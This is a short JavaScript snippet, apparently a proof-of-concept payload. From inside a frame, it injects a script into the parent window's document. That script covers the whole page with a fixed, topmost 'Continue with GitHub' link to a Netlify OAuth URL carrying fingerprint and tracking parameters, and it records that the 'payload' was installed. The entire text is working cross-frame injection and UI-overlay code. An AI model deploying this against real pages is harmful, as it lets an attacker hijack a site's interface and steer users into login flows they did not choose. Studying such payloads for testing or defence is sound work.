(() => {
  try {
    const mainDocument = parent.document;
    const script = mainDocument.createElement("script");

    script.textContent = `
      (() => {
        // This code is now executing in the parent/main window.
        console.log("Executing in main window:", window === parent);

        document.getElementById("oauth-main-link")?.remove();

        const a = document.createElement("a");
        a.id = "oauth-main-link";

        a.href =
          "https://api.netlify.com/auth" +
          "?provider=github" +
          "&site_id=app.netlify.com" +
          "&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09" +
          "&login=true" +
          "&entry_point=direct" +
          "&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f" +
          "&device_fingerprint=bbbac72e6221cf088819fff54ca43b40" +
          "&redirect=" +
          encodeURIComponent("https://www.netlify.com/") +
          "&use_redirect=true";

        a.target = "_blank";
        a.rel = "noopener noreferrer";
        a.textContent = "Continue with GitHub";

        a.style.cssText = [
          "position:fixed",
          "inset:0",
          "width:100vw",
          "height:100vh",
          "background:#fff",
          "color:#000",
          "font-size:48px",
          "display:flex",
          "align-items:center",
          "justify-content:center",
          "z-index:2147483647",
          "text-decoration:none",
          "cursor:pointer"
        ].join(";");

        a.addEventListener("click", () => {
          // Created and executed in the main window.
          document.documentElement.setAttribute(
            "data-main-click-executed",
            "true"
          );

          a.textContent = "Main-window handler executed";
          a.style.background = "#90ee90";

          console.log(
            "Main-window click confirmed",
            window.location.href
          );

          // Do not call preventDefault(): OAuth opens normally.
        });

        document.body.appendChild(a);

        document.documentElement.setAttribute(
          "data-main-payload-installed",
          "true"
        );
      })();
    `;

    (mainDocument.head || mainDocument.documentElement)
      .appendChild(script);

    script.remove();
  } catch (error) {
    console.error("Could not install in parent window:", error);
  }
})();
